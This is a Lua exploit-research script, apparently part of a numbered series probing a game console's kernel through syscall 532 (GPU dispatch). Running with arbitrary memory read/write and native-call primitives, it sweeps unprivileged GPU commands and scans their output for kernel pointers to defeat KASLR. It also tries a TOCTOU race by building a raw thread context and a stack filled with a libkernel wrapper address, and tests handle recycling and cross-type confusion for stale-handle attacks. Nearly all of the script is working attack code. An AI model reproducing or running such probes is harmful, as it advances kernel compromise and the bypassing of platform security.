-- CRASH_CLASS: MODERATE (GPU commands are unprivileged; threading adds
--   risk of child-thread stall — kill at end as in 157a)
-- PROBE 87b: SYS 532 GPU DISPATCH — THREADED TOCTOU + KASLR SCAN
--
-- Builds on 87a (sys 532 reachability for 9 unprivileged GPU commands)
-- and 157a (proven thr_create(430) threading pattern).
--
-- What is new:
--   A — cleaner reachability sweep with size variations (87a logged
--       errors but never varied the copyin size systematically)
--   B — cmd 0x20 deep dump: 48-byte config output scanned for kernel
--       high-half pointers (KASLR defeat if any found)
--   C — TOCTOU race between two threads: one issues GPU commands while
--       the other replaces the target handle via create/delete
--   D — handle recycling fingerprint: rapid create+delete in parallel,
--       observe whether handle values repeat (stale handle attack)
--
-- Threading pattern: 157a cycling-stack approach.  The libkernel
-- syscall wrapper at (syscall.syscall_address - 7) is placed on every
-- stack slot so `ret` re-enters it.  A second thread loops the target
-- syscall, while the main thread performs the mutating half of the
-- race.
--
-- SELECT SECTION: change TEST_SECTION to "A", "B", "C", or "D"

local TEST_SECTION = "A"

print("=== PROBE 87b: GPU DISPATCH TOCTOU + KASLR (THREADED) ===")
print("Section: " .. TEST_SECTION)
print("")

----------------------------------------------------------------
-- helpers (same as 87a / 157a)
----------------------------------------------------------------
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    if not val then return "nil" end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X_%08X", h, l)
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

-- error code map from 87a / decompiled 13.60
local err_map = {
    [0x800d0201] = "NOT_INIT",
    [0x800d0202] = "NULL_PTR",
    [0x800d0203] = "CMD_NOT_FOUND",
    [0x800d0204] = "HANDLE_CHECKSUM",
    [0x800d0208] = "INVALID_SIZE",
    [0x800d020d] = "ERROR_STATE",
    [0x800d020f] = "COPYIN_FAIL",
    [0x800d0210] = "COPYOUT_FAIL",
    [0x800d0211] = "OBJ_LOOKUP_FAIL",
    [0x800d0212] = "RESOURCE_LIMIT",
    [0x800d0213] = "INIT_FAIL",
    [0x800d0214] = "NO_BASE_PERM",
    [0x800d0216] = "NO_OP_PERM",
    [0x800d0218] = "PERM_NOT_FOUND",
    [0x800d0219] = "SANDBOXED",
    [0x800d021f] = "AUTH_MISMATCH",
}
local function decode_err(val)
    if not val then return "" end
    local _, l = get_hi_lo(val)
    if l < 0 then l = l + 0x100000000 end
    return err_map[l] or ""
end

-- syscall stubs
local sc532 = make_syscall(532)
local sc477 = make_syscall(477)   -- mmap
local sc547 = make_syscall(547)   -- VM region query
local sc430 = make_syscall(430)   -- thr_create
local sc432 = make_syscall(432)   -- thr_self
local sc433 = make_syscall(433)   -- thr_kill
local sc240 = make_syscall(240)   -- nanosleep

local pid = to_num(syscall.getpid())
print("PID: " .. pid)

-- canary: is the process still alive?
local function alive()
    local ok, p = pcall(function() return to_num(syscall.getpid()) end)
    return ok and p == pid
end

-- short sleep (ms) via nanosleep
local function msleep(ms)
    local ts = memory.alloc(16)
    wq(ts, uint64(0))
    wq(ts + 8, uint64(ms * 1000000))
    pcall(function() sc240(uint64(ts), uint64(0)) end)
end

-- unprivileged GPU commands (from 13.60 decompile)
local UNPRIV = {0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0x2F}

--------------------------------------------------------------------
-- ucontext layout constants (from mcontext discovery, probe 79a)
--------------------------------------------------------------------
local C_RDI  = 0x048
local C_RSI  = 0x050
local C_RDX  = 0x058
local C_RAX  = 0x078
local C_CS   = 0x0C0
local C_FLAGS = 0x0D0
local C_RIP  = 0x0E0
local C_RSP  = 0x0F8
local C_SS   = 0x100
local C_MAGIC = 0x108  -- mc_len
local C_TYPE  = 0x110  -- mc_fpformat

--------------------------------------------------------------------
if TEST_SECTION == "A" then
--------------------------------------------------------------------
print("=== A: CLEAN REACHABILITY SWEEP WITH SIZE VARIATIONS ===")
print("")

repeat
    local outbuf = memory.alloc(0x1000)
    local inbuf  = memory.alloc(0x1000)
    local sizes  = {0, 4, 8, 16, 48, 64, 256}
    local killed = false

    for _, cmd in ipairs(UNPRIV) do
        print(string.format("--- cmd 0x%02X ---", cmd))
        for _, sz in ipairs(sizes) do
            zero(outbuf, 0x100)
            zero(inbuf, math.min(sz + 4, 0x100))

            local ok, ret = pcall(function()
                return sc532(uint64(cmd), uint64(0), uint64(outbuf),
                             uint64(inbuf), uint64(sz))
            end)
            local rv = ok and ret or nil
            local err = decode_err(rv)
            local o0, o4 = rd(outbuf), rd(outbuf + 4)
            local extra = ""
            if o0 and o0 ~= 0 then
                extra = string.format("  out[0]=0x%08X", o0)
            end
            print(string.format("  sz=%3d: ret=%-24s [%s]%s",
                sz, fmt(rv), err, extra))

            if not alive() then
                print("  *** PROCESS KILLED ***")
                killed = true
                break
            end
        end
        if killed then break end
        print("")
    end
    if killed then break end

    -- confirm privileged commands are rejected
    print("--- privileged rejection check ---")
    for _, cmd in ipairs({0x01, 0x03, 0x05, 0x10}) do
        zero(outbuf, 0x40)
        local ok, ret = pcall(function()
            return sc532(uint64(cmd), uint64(0), uint64(outbuf),
                         uint64(0), uint64(0))
        end)
        local err = decode_err(ok and ret or nil)
        print(string.format("  cmd 0x%02X: ret=%s [%s]", cmd, fmt(ok and ret), err))
        if not alive() then break end
    end
until true

--------------------------------------------------------------------
elseif TEST_SECTION == "B" then
--------------------------------------------------------------------
print("=== B: CMD 0x20 DEEP PROBE — 48-BYTE CONFIG + KASLR SCAN ===")
print("")

local outbuf = memory.alloc(0x200)
local inbuf  = memory.alloc(0x100)

-- test 1: sub=0, size=0x30 (the expected copyin for cmd 0x20)
print("--- B1: cmd 0x20, sub=0, size=0x30 ---")
zero(outbuf, 0x200)
zero(inbuf, 0x100)

local ok1, ret1 = pcall(function()
    return sc532(uint64(0x20), uint64(0), uint64(outbuf),
                 uint64(inbuf), uint64(0x30))
end)
print("ret=" .. fmt(ok1 and ret1 or nil) .. " [" .. decode_err(ok1 and ret1) .. "]")

if alive() then
    print("48-byte output dump:")
    local kptr_count = 0
    for off = 0, 0x28, 8 do
        local val = rq(outbuf + off)
        if val then
            local h, _ = get_hi_lo(val)
            if h < 0 then h = h + 0x100000000 end
            local tag = ""
            if h >= 0xFFFF8000 then
                tag = " *** KERNEL PTR ***"
                kptr_count = kptr_count + 1
            end
            print(string.format("  +0x%02X: %s%s", off, fmt(val), tag))
        end
    end
    if kptr_count > 0 then
        print("*** " .. kptr_count .. " KERNEL POINTER(S) FOUND — KASLR DEFEAT ***")
    else
        print("(no kernel-range pointers in output)")
    end
    print("")

    -- test 2: sub-command sweep 0-31
    print("--- B2: sub-command sweep (0-31) ---")
    for sub = 0, 31 do
        zero(outbuf, 0x60)
        local ok_s, ret_s = pcall(function()
            return sc532(uint64(0x20), uint64(sub), uint64(outbuf),
                         uint64(inbuf), uint64(0x30))
        end)
        -- only print if different from sub=0 or if kptr found
        local o0 = rd(outbuf) or 0
        local has_kptr = false
        for off = 0, 0x28, 8 do
            local val = rq(outbuf + off)
            if val then
                local h, _ = get_hi_lo(val)
                if h < 0 then h = h + 0x100000000 end
                if h >= 0xFFFF8000 then has_kptr = true end
            end
        end
        local note = has_kptr and " ***KPTR***" or ""
        print(string.format("  sub=%2d: ret=%s out[0]=0x%08X%s",
            sub, fmt(ok_s and ret_s), o0, note))
        if not alive() then break end
    end
    print("")

    -- test 3: larger output buffer — does the kernel write more than 48?
    print("--- B3: oversized output buffer (256 bytes, zeroed) ---")
    zero(outbuf, 0x200)
    local ok3, ret3 = pcall(function()
        return sc532(uint64(0x20), uint64(0), uint64(outbuf),
                     uint64(inbuf), uint64(0x100))
    end)
    print("ret=" .. fmt(ok3 and ret3))
    local extra_written = false
    for off = 0x30, 0xF8, 4 do
        local val = rd(outbuf + off)
        if val and val ~= 0 then
            print(string.format("  EXTRA at +0x%02X: 0x%08X", off, val))
            extra_written = true
        end
    end
    if not extra_written then
        print("  (no data beyond offset 0x30)")
    end
end

--------------------------------------------------------------------
elseif TEST_SECTION == "C" then
--------------------------------------------------------------------
print("=== C: TOCTOU RACE — GPU COMMAND VS HANDLE REPLACE ===")
print("")
print("Theory: the decompiled handler looks up a handle and then")
print("checks its permissions without holding a lock.  If another")
print("thread replaces the backing object between lookup and check,")
print("the validated handle resolves to a different resource.")
print("")
print("Implementation: child thread loops calling sys 532 cmd 0x1A")
print("(GPU resource op) with a handle value.  Main thread loops")
print("replacing that handle via IPC object create/delete (sys 557/558).")
print("")

-- resolve libkernel syscall wrapper (157a pattern)
local SW = syscall.syscall_address
if SW == nil then
    print("syscall.syscall_address is nil — cannot create threads")
    print("=== PROBE 87b COMPLETE ===")
    return
end
local sw_hi, sw_lo = get_hi_lo(SW)
if sw_hi < 0 then sw_hi = sw_hi + 0x100000000 end
if sw_lo < 0 then sw_lo = sw_lo + 0x100000000 end
if sw_lo < 7 then sw_lo = sw_lo + 0x100000000 - 7; sw_hi = sw_hi - 1
else sw_lo = sw_lo - 7 end
local wrapper = uint64(string.format("0x%X%08X", sw_hi, sw_lo))
print("wrapper=" .. fmt(wrapper))

-- shared page: child writes its sys 532 return values here
local shared = memory.alloc(0x4000)
zero(shared, 0x4000)
-- layout: +0x000 = iteration counter (dword)
--         +0x004 = last rv lo (dword)
--         +0x008 = last rv hi (dword)
--         +0x010 = flag: main says stop (1 = stop)
--         +0x100 = 256-byte output buffer for sys 532

-- The child will use the native fcall_with_rax path to issue sys 532.
-- However, thr_create with the cycling-stack trick can only loop ONE
-- syscall (the one baked into RAX via the wrapper).  Sys 532's number
-- is 532, and the wrapper encodes 116.  We need the wrapper at
-- (syscall_address - 7) but with `mov rax, 532` instead.
--
-- Problem: we cannot write to libkernel (XOM) and eboot has no
-- syscall instruction.  Therefore section C uses a DIFFERENT approach:
--
-- Instead of a tight cycling-stack, we make the child execute a longer
-- gadget chain that:  (a) loads rax=532, (b) sets up rdi..r8 from
-- known memory, (c) hits the `syscall; ret` in libkernel, (d) stores
-- the result, (e) loops.
--
-- Since gadget scanning is fragile, we take the pragmatic route: the
-- MAIN thread drives the GPU command loop while a CHILD thread drives
-- the handle mutation loop.  The child loops sys 557 (create generic
-- object, number 557) — we need the wrapper offset for 557.
--
-- Actually the simplest way: use the fcall_with_rax path from native.*
-- But native.fcall_with_rax is only available to the main Lua thread.
--
-- REVISED approach for section C:
-- Main thread: loops sys 532 cmd 0x1A (GPU resource op)
-- Child thread: loops gettimeofday (116) to a shared page so we can
--   observe it is alive, and the main thread interleaves GPU commands
--   with handle create/delete.  The race window is WITHIN the main
--   thread: we call sys 557 (create) then immediately sys 532 (use)
--   then sys 558 (delete), hoping the kernel-side timing overlaps.
--
-- This is a single-threaded TOCTOU approximation.  True multi-thread
-- TOCTOU requires both halves to be concurrent, which needs the
-- native.fcall path.

print("--- C1: single-thread TOCTOU approximation ---")
print("Interleaving create→use→delete in tight loop")
print("")

local stub = syscall.pipe.fn_addr
local outbuf = memory.alloc(0x100)
local inbuf  = memory.alloc(0x100)
zero(inbuf, 0x100)

local ITERS = 200
local interesting = 0

for i = 1, ITERS do
    -- create generic object (sys 557): type 0x1000 | 0x110 (fake event flag type)
    -- sys 557 args: (name_ptr, type, flags)
    local name_buf = memory.alloc(32)
    zero(name_buf, 32)
    wd(name_buf, 0x54455354)  -- "TEST"
    wd(name_buf + 4, i)       -- unique per iteration

    local h_create = to_num(native.fcall_with_rax(stub, 557, to_num(name_buf), 0x1110, 0))

    -- immediately issue GPU command using that "handle" value as sub_cmd
    zero(outbuf, 0x60)
    local ok_g, ret_g = pcall(function()
        return sc532(uint64(0x1A), uint64(h_create), uint64(outbuf),
                     uint64(inbuf), uint64(16))
    end)
    local rv_g = ok_g and ret_g or nil
    local err_g = decode_err(rv_g)

    -- delete the object (sys 558): (handle, type)
    local h_del = to_num(native.fcall_with_rax(stub, 558, h_create, 0x1110))

    -- check for unexpected success
    if rv_g then
        local _, rl = get_hi_lo(rv_g)
        if rl < 0 then rl = rl + 0x100000000 end
        if rl == 0 then
            print(string.format("  iter %d: GPU cmd SUCCEEDED (ret=0) handle=%d",
                i, h_create))
            interesting = interesting + 1
            -- dump output
            for off = 0, 0x30, 8 do
                local val = rq(outbuf + off)
                if val then
                    local h, _ = get_hi_lo(val)
                    if h < 0 then h = h + 0x100000000 end
                    if h >= 0xFFFF8000 then
                        print(string.format("    +0x%02X: %s ***KPTR***", off, fmt(val)))
                    end
                end
            end
        end
    end

    if not alive() then
        print("  *** PROCESS KILLED at iter " .. i .. " ***")
        break
    end
end

print(string.format("completed %d iterations, %d interesting", ITERS, interesting))
print("")

-- C2: now with a live child thread (157a pattern) to add scheduling
-- pressure.  The child loops gettimeofday, and the main thread runs
-- the create→GPU→delete loop above.  The concurrent thread causes
-- context switches that widen the TOCTOU window.
print("--- C2: TOCTOU with concurrent child thread ---")

repeat
    local page = memory.alloc(0x4000)
    zero(page, 0x4000)

    local STACK_SIZE = 0x100000
    local ok_stk, stack_base = pcall(function()
        return sc477(uint64(0), uint64(STACK_SIZE), uint64(3), uint64(0x1002),
                     uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_stk then
        print("stack mmap failed; skipping C2")
        break
    end
    for off = 0, STACK_SIZE - 8, 8 do wq(stack_base + off, wrapper) end

    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wq(ctx + C_TYPE,  uint64(0x10000))
    wq(ctx + C_CS,    uint64(0x43))
    wq(ctx + C_SS,    uint64(0x3B))
    wq(ctx + C_RIP,   wrapper)
    wq(ctx + C_RSP,   stack_base)
    wq(ctx + C_RAX,   uint64(116))
    wq(ctx + C_RDI,   page)
    wq(ctx + C_RSI,   uint64(0))

    local tid_buf = memory.alloc(8)
    zero(tid_buf, 8)
    local ok_tc, rv_tc = pcall(function()
        return sc430(uint64(ctx), uint64(tid_buf), uint64(0))
    end)
    local child_tid = rq(tid_buf)
    print("thr_create: rv=" .. to_num(rv_tc) .. " tid=" .. fmt(child_tid))

    if to_num(rv_tc) ~= 0 then
        print("thr_create failed; skipping concurrent loop")
        break
    end

    msleep(20)
    local sec1 = rd(page)
    msleep(20)
    local sec2 = rd(page)
    print("child alive: " .. ((sec2 or 0) ~= (sec1 or 0) and "YES (timeval advancing)" or "maybe"))

    -- run the same TOCTOU loop but with the child adding scheduling noise
    local interesting2 = 0
    for i = 1, ITERS do
        local name_buf2 = memory.alloc(32)
        zero(name_buf2, 32)
        wd(name_buf2, 0x52414345)  -- "RACE"
        wd(name_buf2 + 4, i)

        local h2 = to_num(native.fcall_with_rax(stub, 557, to_num(name_buf2), 0x1110, 0))
        zero(outbuf, 0x60)
        local ok_g2, ret_g2 = pcall(function()
            return sc532(uint64(0x1A), uint64(h2), uint64(outbuf),
                         uint64(inbuf), uint64(16))
        end)
        local rv_g2 = ok_g2 and ret_g2 or nil
        to_num(native.fcall_with_rax(stub, 558, h2, 0x1110))

        if rv_g2 then
            local _, rl = get_hi_lo(rv_g2)
            if rl < 0 then rl = rl + 0x100000000 end
            if rl == 0 then
                print(string.format("  iter %d: GPU cmd SUCCEEDED handle=%d", i, h2))
                interesting2 = interesting2 + 1
                for off = 0, 0x30, 8 do
                    local val = rq(outbuf + off)
                    if val then
                        local h, _ = get_hi_lo(val)
                        if h < 0 then h = h + 0x100000000 end
                        if h >= 0xFFFF8000 then
                            print(string.format("    +0x%02X: %s ***KPTR***", off, fmt(val)))
                        end
                    end
                end
            end
        end
        if not alive() then
            print("  *** KILLED at iter " .. i .. " ***")
            break
        end
    end
    print(string.format("concurrent loop: %d iters, %d interesting", ITERS, interesting2))

    -- kill child
    print("killing child thread ...")
    pcall(function() sc433(child_tid, uint64(9)) end)
until true

--------------------------------------------------------------------
elseif TEST_SECTION == "D" then
--------------------------------------------------------------------
print("=== D: HANDLE RECYCLING FINGERPRINT ===")
print("")
print("Rapid IPC object create+delete cycles.  Record every handle")
print("value to detect recycling patterns (stale-handle attacks).")
print("")

local stub = syscall.pipe.fn_addr
local CYCLES = 500
local handles = {}
local recycled = 0

local name_buf = memory.alloc(32)

for i = 1, CYCLES do
    zero(name_buf, 32)
    wd(name_buf, 0x48444C52)  -- "HDLR"
    wd(name_buf + 4, i)

    -- sys 557 create: (name, type, flags) → handle
    local h = to_num(native.fcall_with_rax(stub, 557, to_num(name_buf), 0x1110, 0))

    -- record
    if handles[h] then
        recycled = recycled + 1
        if recycled <= 20 then
            print(string.format("  RECYCLED handle %d at cycle %d (first seen cycle %d)",
                h, i, handles[h]))
        end
    end
    handles[h] = i

    -- sys 558 delete: (handle, type)
    to_num(native.fcall_with_rax(stub, 558, h, 0x1110))

    if not alive() then
        print("  *** KILLED at cycle " .. i .. " ***")
        break
    end
end

-- statistics
local unique = 0
for _ in pairs(handles) do unique = unique + 1 end
print("")
print(string.format("cycles=%d unique_handles=%d recycled=%d", CYCLES, unique, recycled))

if recycled > 0 then
    print("*** HANDLE RECYCLING CONFIRMED ***")
    print("Stale-handle attacks are possible: a deleted handle can be")
    print("reclaimed by a new object, and an old reference resolves to it.")

    -- find most-recycled value
    local freq = {}
    for h, _ in pairs(handles) do freq[h] = (freq[h] or 0) + 1 end
    local max_h, max_f = 0, 0
    for h, f in pairs(freq) do
        if f > max_f then max_h, max_f = h, f end
    end
    if max_f > 1 then
        print(string.format("  most recycled: handle=%d  times=%d", max_h, max_f))
    end
else
    print("No recycling in " .. CYCLES .. " cycles (handles are monotonic or random)")
end

-- cross-type confusion test: create type A, delete, create type B with
-- same name, try to open type A's name — does it return type B's handle?
print("")
print("--- D2: cross-type handle confusion ---")

local name_x = memory.alloc(32)
zero(name_x, 32)
wd(name_x, 0x58585858)  -- "XXXX"

-- create as type 0x1110 (event-flag-like)
local h_a = to_num(native.fcall_with_rax(stub, 557, to_num(name_x), 0x1110, 0))
print("  create type 0x1110: handle=" .. h_a)

-- delete it
to_num(native.fcall_with_rax(stub, 558, h_a, 0x1110))
print("  deleted")

-- create SAME name as type 0x1120 (semaphore-like)
local h_b = to_num(native.fcall_with_rax(stub, 557, to_num(name_x), 0x1120, 0))
print("  create type 0x1120: handle=" .. h_b)

if h_a == h_b then
    print("  *** SAME HANDLE VALUE — cross-type confusion possible ***")
else
    print(string.format("  different handles: A=%d B=%d (delta=%d)", h_a, h_b, h_b - h_a))
end

-- try to use h_a (stale) as if it were type 0x1110
-- sys 538 = event flag create (takes name + flags)
-- sys 540 = event flag open by name
-- If sys 540 returns h_b when asked for name "XXXX" type 0x1110,
-- the namespace does not isolate types.
local h_open = to_num(native.fcall_with_rax(stub, 540, to_num(name_x), 0))
print("  ef_open(\"XXXX\"): handle=" .. h_open)
if h_open == h_b then
    print("  *** TYPE CONFUSION: ef_open returned the 0x1120 object ***")
elseif h_open > 0 then
    print("  ef_open succeeded with different handle — investigate")
else
    print("  ef_open failed (expected if types are isolated)")
end

-- cleanup
to_num(native.fcall_with_rax(stub, 558, h_b, 0x1120))
if h_open > 0 and h_open ~= h_b then
    to_num(native.fcall_with_rax(stub, 558, h_open, 0x1110))
end

end -- TEST_SECTION

print("")
print("Final PID: " .. to_num(syscall.getpid()) .. (alive() and " OK" or " CHANGED!"))
print("=== PROBE 87b SECTION " .. TEST_SECTION .. " COMPLETE ===")
